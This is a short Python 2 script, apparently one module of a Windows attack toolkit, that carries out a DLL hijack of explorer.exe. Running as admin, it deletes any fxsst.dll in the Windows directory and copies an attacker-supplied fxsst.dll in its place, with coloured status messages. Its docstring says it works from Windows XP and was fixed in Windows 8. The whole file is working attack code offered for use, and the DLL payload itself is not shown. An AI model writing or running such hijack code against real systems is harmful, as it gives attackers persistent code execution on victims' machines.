"""
Works from: Windows XP
Fixed in: Windows 8
"""
import os
import wmi
import shutil
import ctypes
from colorama import init, Fore
init(convert=True)

wmi = wmi.WMI()

dll_name = "fxsst.dll"

def successBox():
	return (Fore.GREEN + '[+]' + Fore.RESET)

def errorBox():
	return (Fore.RED + '[-]' + Fore.RESET)

def infoBox():
	return (Fore.CYAN + '[!]' + Fore.RESET)	

def warningBox():
	return (Fore.YELLOW + '[!]' + Fore.RESET)

def windows_directory():
	for os in wmi.Win32_OperatingSystem():
		return os.WindowsDirectory	
	
def fax_dll_hijack():
	print " {} fax_dll_hijack: Attempting to copy: {} to: {} in order to dll hijack explorer".format(infoBox(),dll_name,windows_directory())
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		print " {} fax_dll_hijack: We are running as admin, we can proceed".format(infoBox())
		
		if (os.path.isfile(os.path.join(windows_directory(),dll_name)) == True):
			try:
				os.remove(os.path.join(windows_directory(),dll_name))
				print " {} fax_dll_hijack: Successfully removed: {} from: {}".format(successBox(),dll_name,windows_directory())
			except Exception as error:
				print " {} fax_dll_hijack: Unable to remove: {} from: {}".format(errorBox(),dll_name,windows_directory())
				return False

		try:
			shutil.copy(dll_name,windows_directory())
			print " {} fax_dll_hijack: Successfully copied: {} to: {}".format(successBox(),dll_name,windows_directory())
		except shutil.Error as error:
			print " {} fax_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
			return False
		except IOError as error:
			print " {} fax_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
			return False
	else:
		print " {} fax_dll_hijack: We are not admin, cannot proceed".format(errorBox())
		return False